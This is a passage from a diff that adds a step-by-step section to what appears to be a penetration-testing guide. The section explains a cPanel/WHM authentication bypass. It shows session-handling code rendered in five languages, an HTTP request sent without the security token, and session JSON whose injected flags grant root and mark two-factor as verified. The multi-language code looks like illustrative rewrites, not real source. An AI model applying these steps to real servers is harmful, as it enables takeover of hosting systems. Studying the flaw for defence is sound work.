+                'nocache' => 1,
+                'keep_locked_open' => 1,
+                'rw' => 1
+            ]
+        );
+
+        return [
+            '_session' => $session,
+            '_fh'      => $fh,
+            '_lock'    => $conflock,
+            '_data'    => Cpanel_Session::decode_origin($ref),
+        ];
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+class SessionLoader {
+
+    static new(session, check_expiration) {
+
+        if (check_expiration
+            ? !Cpanel.Session.Load.sessionExistsAndIsCurrent(session)
+            : !Cpanel.Session.Load.sessionExists(session)) {
+
+            throw new Error("The session ^`^|" + session + " ^`^} does not exist");
+        }
+
+        Cpanel.Session.Load.getObPart(session);
+
+        let session_file = Cpanel.Session.Load.getSessionFilePath(session);
+
+        // Cpanel::Transaction not available here due to memory constraints
+        let result = Cpanel.Config.LoadConfig.loadConfig(
+            session_file,
+            null,
+            "=",
+            null,
+            0,
+            0,
+            {
+                skip_readable_check: 1,
+                nocache: 1,
+                keep_locked_open: 1,
+                rw: 1
+            }
+        );
+
+        return new SessionLoader(
+            session,
+            result.fh,
+            result.conflock,
+            Cpanel.Session.decodeOrigin(result.ref)
+        );
+    }
+
+    constructor(session, fh, lock, data) {
+        this._session = session;
+        this._fh = fh;
+        this._lock = lock;
+        this._data = data;
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Then find the function that rewrites the cache file from the raw session file after ignoring the cache (for example, `write_session` handles updating the cache file)
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub save {
+    my ($self) = @_;
+    Cpanel::Session::filter_sessiondata( $self->{_data} );
+    Cpanel::Session::encode_origin( $self->{_data} );
+    Cpanel::Session::write_session( $self->{_session}, $self->{_fh}, $self->{_data} )
+        or die "Failed to write the session file: $!";
+    return $self->_close_session();
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public bool Save()
+{
+    Cpanel.Session.FilterSessionData(this._data);
+    Cpanel.Session.EncodeOrigin(this._data);
+
+    if (!Cpanel.Session.WriteSession(this._session, this._fh, this._data))
+    {
+        throw new Exception("Failed to write the session file: " + System.Runtime.InteropServices.Marshal.GetLastWin32Error());
+    }
+
+    return this.CloseSession();
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public boolean save() throws Exception {
+
+    Cpanel.Session.filterSessiondata(this._data);
+    Cpanel.Session.encodeOrigin(this._data);
+
+    boolean result = Cpanel.Session.writeSession(this._session, this._fh, this._data);
+
+    if (!result) {
+        throw new Exception("Failed to write the session file");
+    }
+
+    return this.closeSession();
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+public function save()
+{
+    Cpanel_Session::filter_sessiondata($this->_data);
+    Cpanel_Session::encode_origin($this->_data);
+
+    if (!Cpanel_Session::write_session($this->_session, $this->_fh, $this->_data)) {
+        die("Failed to write the session file: " . error_get_last()['message']);
+    }
+
+    return $this->_close_session();
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+save() {
+
+    Cpanel.Session.filterSessiondata(this._data);
+    Cpanel.Session.encodeOrigin(this._data);
+
+    let result = Cpanel.Session.writeSession(this._session, this._fh, this._data);
+
+    if (!result) {
+        throw new Error("Failed to write the session file");
+    }
+
+    return this._close_session();
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Review the method responsible for rewriting and updating the cache
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub write_session {
+      my ($session, $session_fh, $session_ref) = @_;
+
+      # Step 1: write the session raw text file, "key=value\n" per record.
+      my $flush_result = Cpanel::Config::FlushConfig::flushConfig(
+          $session_fh, $session_ref, '=', undef, { 'perms' => 0600 },
+      );
+      return $flush_result unless $flush_result;
+
+      # Step 2: maintain a tiny "preauth" flag-file alongside the session.
+      if ($session_ref->{'needs_auth'}) {
+          unless (-e $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session) {
+              if (open my $preauth_fh, '>',
+                  $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session)
+              {
+                  print $preauth_fh $main::now || time;
+                  close $preauth_fh;
+              }
+          }
+      }
+      elsif (-e $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session) {
+          unlink $Cpanel::Config::Session::SESSION_DIR . '/preauth/' . $session;
+      }
+
+      # Step 3: write the binary (JSON) cache file with the same hash content.
+      Cpanel::FileUtils::Write::overwrite(
+          $Cpanel::Config::Session::SESSION_DIR . '/cache/' . $session,
+          Cpanel::AdminBin::Serializer::Dump($session_ref),
+          0600,
+      );
+
+      return 1;
+  }
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public bool WriteSession(string session, FileStream session_fh, Dictionary<string, object> session_ref)
+{
+    // Step 1: write the session raw text file, "key=value\n" per record.
+    bool flush_result = Cpanel.Config.FlushConfig.FlushConfig(
+        session_fh,
+        session_ref,
+        "=",
+        null,
+        new Dictionary<string, object> { { "perms", "0600" } }
+    );
+
+    if (!flush_result)
+        return false;
+
+    string baseDir = Cpanel.Config.Session.SESSION_DIR;
+
+    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
+    if (session_ref.ContainsKey("needs_auth") && session_ref["needs_auth"] != null)
+    {
+        string preauthPath = baseDir + "/preauth/" + session;
+
+        if (!File.Exists(preauthPath))
+        {
+            File.WriteAllText(preauthPath, DateTimeOffset.Now.ToUnixTimeSeconds().ToString());
+        }
+    }
+    else
+    {
+        string preauthPath = baseDir + "/preauth/" + session;
+
+        if (File.Exists(preauthPath))
+        {
+            File.Delete(preauthPath);
+        }
+    }
+
+    // Step 3: write the binary (JSON) cache file with the same hash content.
+    string cachePath = baseDir + "/cache/" + session;
+
+    File.WriteAllText(
+        cachePath,
+        Cpanel.AdminBin.Serializer.Dump(session_ref)
+    );
+
+    return true;
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public boolean writeSession(String session, FileOutputStream session_fh, Map<String, Object> session_ref) {
+
+    // Step 1: write the session raw text file, "key=value\n" per record.
+    boolean flush_result = Cpanel.Config.FlushConfig.flushConfig(
+            session_fh,
+            session_ref,
+            "=",
+            null,
+            new HashMap<String, Object>() {{
+                put("perms", "0600");
+            }}
+    );
+
+    if (!flush_result)
+        return false;
+
+    String baseDir = Cpanel.Config.Session.SESSION_DIR;
+
+    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
+    if (session_ref.containsKey("needs_auth") && session_ref.get("needs_auth") != null) {
+
+        String preauthPath = baseDir + "/preauth/" + session;
+
+        File f = new File(preauthPath);
+        if (!f.exists()) {
+            try (FileWriter fw = new FileWriter(f)) {
+                fw.write(String.valueOf(System.currentTimeMillis()));
+            }
+        }
+
+    } else {
+
+        String preauthPath = baseDir + "/preauth/" + session;
+        File f = new File(preauthPath);
+
+        if (f.exists()) {
+            f.delete();
+        }
+    }
+
+    // Step 3: write the binary (JSON) cache file with the same hash content.
+    String cachePath = baseDir + "/cache/" + session;
+
+    try (FileWriter fw = new FileWriter(cachePath)) {
+        fw.write(Cpanel.AdminBin.Serializer.dump(session_ref));
+    } catch (Exception e) {
+        throw new RuntimeException(e);
+    }
+
+    return true;
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function write_session($session, $session_fh, $session_ref)
+{
+    // Step 1: write the session raw text file, "key=value\n" per record.
+    $flush_result = Cpanel_Config_FlushConfig::flushConfig(
+        $session_fh,
+        $session_ref,
+        '=',
+        null,
+        ['perms' => '0600']
+    );
+
+    if (!$flush_result) {
+        return false;
+    }
+
+    $baseDir = Cpanel_Config_Session::SESSION_DIR;
+
+    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
+    if (!empty($session_ref['needs_auth'])) {
+
+        $preauthPath = $baseDir . '/preauth/' . $session;
+
+        if (!file_exists($preauthPath)) {
+            file_put_contents($preauthPath, time());
+        }
+
+    } else {
+
+        $preauthPath = $baseDir . '/preauth/' . $session;
+
+        if (file_exists($preauthPath)) {
+            unlink($preauthPath);
+        }
+    }
+
+    // Step 3: write the binary (JSON) cache file with the same hash content.
+    $cachePath = $baseDir . '/cache/' . $session;
+
+    file_put_contents(
+        $cachePath,
+        Cpanel_AdminBin_Serializer::Dump($session_ref)
+    );
+
+    return true;
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+function writeSession(session, session_fh, session_ref) {
+
+    // Step 1: write the session raw text file, "key=value\n" per record.
+    let flush_result = Cpanel.Config.FlushConfig.flushConfig(
+        session_fh,
+        session_ref,
+        "=",
+        null,
+        { perms: "0600" }
+    );
+
+    if (!flush_result)
+        return false;
+
+    const fs = require("fs");
+    let baseDir = Cpanel.Config.Session.SESSION_DIR;
+
+    // Step 2: maintain a tiny "preauth" flag-file alongside the session.
+    if (session_ref.needs_auth) {
+
+        let preauthPath = baseDir + "/preauth/" + session;
+
+        if (!fs.existsSync(preauthPath)) {
+            fs.writeFileSync(preauthPath, Date.now().toString());
+        }
+
+    } else {
+
+        let preauthPath = baseDir + "/preauth/" + session;
+
+        if (fs.existsSync(preauthPath)) {
+            fs.unlinkSync(preauthPath);
+        }
+    }
+
+    // Step 3: write the binary (JSON) cache file with the same hash content.
+    let cachePath = baseDir + "/cache/" + session;
+
+    fs.writeFileSync(
+        cachePath,
+        Cpanel.AdminBin.Serializer.Dump(session_ref)
+    );
+
+    return true;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Find methods like `new` (which ignores the cache and rebuilds it from raw data) and `save` (which stores the updated session). Check under what conditions these methods can be triggered so that your manipulated raw file is used to overwrite the cache file
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub do_token_denied {
+    my ($error_msg, $form_ref, $goto_uri, $use_theme) = @_;
+    ...
+    my $max_tries = 3;
+    if ($user_provided_session_ref = $server_obj->get_current_session_ref_if_exists) {
+        my $session = $server_obj->get_current_session;
+        if (not $server_obj->request->get_supplied_security_token
+            or ++$user_provided_session_ref->{'token_denied'} < $max_tries)
+        {
+            require Cpanel::Session::Modify;
+            my $session_mod = 'Cpanel::Session::Modify'->new($session);     # (1)
+            $session_mod->set('token_denied',
+                defined $session_mod->get('token_denied')
+                ? $session_mod->get('token_denied') + 1
+                : 1
+            );
+            $session_mod->save;                                             # (2)
+            $another_try = 1;
+        }
+    }
+    ...
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public void DoTokenDenied(string error_msg, Dictionary<string, object> form_ref, string goto_uri, bool use_theme)
+{
+    int max_tries = 3;
+
+    var user_provided_session_ref = server_obj.get_current_session_ref_if_exists();
+
+    if (user_provided_session_ref != null)
+    {
+        string session = server_obj.get_current_session();
+
+        if (server_obj.request.get_supplied_security_token() == null
+            || (Convert.ToInt32(user_provided_session_ref["token_denied"]) + 1) < max_tries)
+        {
+            var session_mod = new Cpanel.Session.Modify(session);
+
+            int current = user_provided_session_ref.ContainsKey("token_denied")
+                ? Convert.ToInt32(user_provided_session_ref["token_denied"])
+                : 0;
+
+            session_mod.set("token_denied", current + 1);
+            session_mod.save();
+
+            bool another_try = true;
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public void doTokenDenied(String error_msg, Map<String, Object> form_ref, String goto_uri, boolean use_theme) {
+
+    int max_tries = 3;
+
+    Map<String, Object> user_provided_session_ref =
+            server_obj.getCurrentSessionRefIfExists();
+
+    if (user_provided_session_ref != null) {
+
+        String session = server_obj.getCurrentSession();
+
+        if (server_obj.getRequest().getSuppliedSecurityToken() == null
+                || ((Integer) user_provided_session_ref.getOrDefault("token_denied", 0)) + 1 < max_tries) {
+
+            Cpanel.Session.Modify session_mod = new Cpanel.Session.Modify(session);
+
+            int current = (Integer) user_provided_session_ref.getOrDefault("token_denied", 0);
+
+            session_mod.set("token_denied", current + 1);
+            session_mod.save();
+
+            boolean another_try = true;
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function do_token_denied($error_msg, $form_ref, $goto_uri, $use_theme)
+{
+    $max_tries = 3;
+
+    $user_provided_session_ref = $server_obj->get_current_session_ref_if_exists();
+
+    if ($user_provided_session_ref) {
+
+        $session = $server_obj->get_current_session();
+
+        if (
+            !$server_obj->request->get_supplied_security_token()
+            || ++$user_provided_session_ref['token_denied'] < $max_tries
+        ) {
+
+            $session_mod = new Cpanel_Session_Modify($session);
+
+            $current = isset($user_provided_session_ref['token_denied'])
+                ? $user_provided_session_ref['token_denied']
+                : 0;
+
+            $session_mod->set('token_denied', $current + 1);
+            $session_mod->save();
+
+            $another_try = true;
+        }
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+function doTokenDenied(error_msg, form_ref, goto_uri, use_theme) {
+
+    let max_tries = 3;
+
+    let user_provided_session_ref =
+        server_obj.get_current_session_ref_if_exists();
+
+    if (user_provided_session_ref) {
+
+        let session = server_obj.get_current_session();
+
+        if (
+            !server_obj.request.get_supplied_security_token()
+            || ((user_provided_session_ref.token_denied || 0) + 1) < max_tries
+        ) {
+
+            let session_mod = new Cpanel.Session.Modify(session);
+
+            let current = user_provided_session_ref.token_denied || 0;
+
+            session_mod.set("token_denied", current + 1);
+            session_mod.save();
+
+            let another_try = true;
+        }
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Find where these methods (`new`, `save`) are called in the codebase and determine under what conditions that function is executed
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+sub check_security_token {
+    ...
+    if (not $server_obj->request->get_supplied_security_token) {
+        $failmsg = 'security token missing';
+    }
+    elsif ($ENV{'cp_security_token'} ne $server_obj->request->get_supplied_security_token)  { // (1)
+        $failmsg = 'security token incorrect';
+    }
+    if ($failmsg) {
+        ...
+        do_token_denied($failmsg);                       # (2)
+    }
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+public void CheckSecurityToken()
+{
+    string failmsg = null;
+
+    if (server_obj.request.get_supplied_security_token() == null)
+    {
+        failmsg = "security token missing";
+    }
+    else if (Environment.GetEnvironmentVariable("cp_security_token")
+             != server_obj.request.get_supplied_security_token())
+    {
+        failmsg = "security token incorrect";
+    }
+
+    if (failmsg != null)
+    {
+        DoTokenDenied(failmsg, null, null, false);
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public void checkSecurityToken() {
+
+    String failmsg = null;
+
+    if (server_obj.getRequest().getSuppliedSecurityToken() == null) {
+        failmsg = "security token missing";
+    }
+    else if (!System.getenv("cp_security_token")
+            .equals(server_obj.getRequest().getSuppliedSecurityToken())) {
+        failmsg = "security token incorrect";
+    }
+
+    if (failmsg != null) {
+        doTokenDenied(failmsg, null, null, false);
+    }
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function check_security_token()
+{
+    $failmsg = null;
+
+    if (!$server_obj->request->get_supplied_security_token()) {
+        $failmsg = "security token missing";
+    }
+    elseif ($_ENV['cp_security_token'] != $server_obj->request->get_supplied_security_token()) {
+        $failmsg = "security token incorrect";
+    }
+
+    if ($failmsg) {
+        do_token_denied($failmsg);
+    }
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+function checkSecurityToken() {
+
+    let failmsg = null;
+
+    if (!server_obj.request.get_supplied_security_token()) {
+        failmsg = "security token missing";
+    }
+    else if (process.env.cp_security_token
+        !== server_obj.request.get_supplied_security_token()) {
+        failmsg = "security token incorrect";
+    }
+
+    if (failmsg) {
+        doTokenDenied(failmsg);
+    }
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Check how this function is triggered (for example, through URLs with a security token—removing the token may trigger the cache rewrite process)
+
+```bash
+/cpsess1234567890/scripts2/listaccts
+```
+
+Send a request without the security token
+
+```http
+GET /scripts2/listaccts HTTP/1.1
+Host: target:2087
+Cookie: whostmgrsession=%3aQSJN_sFdKZtCi2o_
+Connection: close
+```
+
+Observe the response
+
+```http
+HTTP/1.1 401 Token Denied
+Cache-Control: no-cache, no-store, must-revalidate, private
+Content-Type: text/html; charset="utf-8"
+```
+{% endstep %}
+
+{% step %}
+Check whether your raw session file has now been used to overwrite the cache file and is usable
+
+```json
+{
+"tfa_verified":"1",                                      <-- was 0, now 1 — injection won
+"user":"root",
+"hasroot":"1",                                           <-- TOP-LEVEL now
+"successful_internal_auth_with_timestamp":"1777462149",  <-- TOP-LEVEL now
+"cp_security_token":"/cpsess0228251236",
+"external_validation_token":"ss27XQjbY11gmCDs",
+"token_denied":"1",
+"pass":"x",                                              <-- stripped to just "x"
+"ip_address":"172.17.0.1",
+"local_ip_address":"172.17.0.2",
+...
+}
+```
+{% endstep %}
+
+{% step %}
+Send a request to internal APIs again. If the response is 200, authentication bypass is successful. If it is 403, look for functions executed after authentication (for example post-auth checks)
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+handle_form_login();
+…
+handle_auth();
+
+my $authtype   = $server_obj->auth->get_auth_type || '';
+my $document   = $server_obj->request->get_document;
+$user          = $server_obj->auth->get_user;
+my $pass       = $server_obj->auth->get_pass;
+…
+if ($Cpanel::App::appname eq 'whostmgrd') {
+    …
+    docheckpass_whostmgrd(
+        'user' => $user,
+        'pass' => $pass,
+        …
+    );
+    …
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+handle_form_login();
+// …
+handle_auth();
+
+string authtype = server_obj.auth.get_auth_type() ?? "";
+string document = server_obj.request.get_document();
+string user = server_obj.auth.get_user();
+string pass = server_obj.auth.get_pass();
+// …
+
+if (Cpanel.App.appname == "whostmgrd")
+{
+    // …
+
+    docheckpass_whostmgrd(new Dictionary<string, object>
+    {
+        { "user", user },
+        { "pass", pass }
+        // …
+    });
+
+    // …
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+handle_form_login();
+// …
+handle_auth();
+
+String authtype = server_obj.auth.get_auth_type();
+if (authtype == null) authtype = "";
+
+String document = server_obj.request.get_document();
+String user = server_obj.auth.get_user();
+String pass = server_obj.auth.get_pass();
+// …
+
+if ("whostmgrd".equals(Cpanel.App.appname)) {
+
+    // …
+
+    Map<String, Object> opts = new HashMap<>();
+    opts.put("user", user);
+    opts.put("pass", pass);
+    // …
+
+    docheckpass_whostmgrd(opts);
+
+    // …
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+handle_form_login();
+// …
+handle_auth();
+
+$authtype = $server_obj->auth->get_auth_type() ?: '';
+$document = $server_obj->request->get_document();
+$user     = $server_obj->auth->get_user();
+$pass     = $server_obj->auth->get_pass();
+// …
+
+if ($Cpanel_App_appname === 'whostmgrd') {
+
+    // …
+
+    docheckpass_whostmgrd([
+        'user' => $user,
+        'pass' => $pass,
+        // …
+    ]);
+
+    // …
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+handle_form_login();
+// …
+handle_auth();
+
+let authtype = server_obj.auth.get_auth_type() || "";
+let document = server_obj.request.get_document();
+let user = server_obj.auth.get_user();
+let pass = server_obj.auth.get_pass();
+// …
+
+if (Cpanel.App.appname === "whostmgrd") {
+
+    // …
+
+    docheckpass_whostmgrd({
+        user: user,
+        pass: pass,
+        // …
+    });
+
+    // …
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Check whether there are conditions where security checks are skipped (for example when flags like `$successful_external_auth_with_timestamp` or `$successful_internal_auth_with_timestamp` are true)
+
+{% tabs %}
+{% tab title="Perl" %}
+```perl
+if ($successful_external_auth_with_timestamp or $successful_internal_auth_with_timestamp) {
+    $authorized = _check_external_internal_auth_from_docheckpass(%OPTS);
+}
+...
+if ($SESSION_ref->{'successful_internal_auth_with_timestamp'}) {
+    $successful_internal_auth_with_timestamp =
+        $SESSION_ref->{'successful_internal_auth_with_timestamp'};
+}
+```
+{% endtab %}
+
+{% tab title="C#" %}
+```csharp
+if (successful_external_auth_with_timestamp || successful_internal_auth_with_timestamp)
+{
+    authorized = _check_external_internal_auth_from_docheckpass(OPTS);
+}
+
+...
+
+if (SESSION_ref["successful_internal_auth_with_timestamp"] != null)
+{
+    successful_internal_auth_with_timestamp =
+        SESSION_ref["successful_internal_auth_with_timestamp"];
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+if (successful_external_auth_with_timestamp || successful_internal_auth_with_timestamp) {
+    authorized = _check_external_internal_auth_from_docheckpass(OPTS);
+}
+
+...
+
+if (SESSION_ref.get("successful_internal_auth_with_timestamp") != null) {
+    successful_internal_auth_with_timestamp =
+        SESSION_ref.get("successful_internal_auth_with_timestamp");
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+if ($successful_external_auth_with_timestamp || $successful_internal_auth_with_timestamp) {
+    $authorized = _check_external_internal_auth_from_docheckpass($OPTS);
+}
+
+...
+
+if (isset($SESSION_ref['successful_internal_auth_with_timestamp'])) {
+    $successful_internal_auth_with_timestamp =
+        $SESSION_ref['successful_internal_auth_with_timestamp'];
+}
+```
+{% endtab %}
+
+{% tab title="Node JS" %}
+```js
+if (successful_external_auth_with_timestamp || successful_internal_auth_with_timestamp) {
+    authorized = _check_external_internal_auth_from_docheckpass(OPTS);
+}
+
+...
+
+if (SESSION_ref.successful_internal_auth_with_timestamp != null) {
+    successful_internal_auth_with_timestamp =
+        SESSION_ref.successful_internal_auth_with_timestamp;
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Modify the condition in the code to bypass password verification, send the request again, and obtain a 200 response
+{% endstep %}
+{% endstepper %}
+
+***
+
 ## Cheat Sheet
 
 ### Parameter Modification <a href="#parameter-modification" id="parameter-modification"></a>
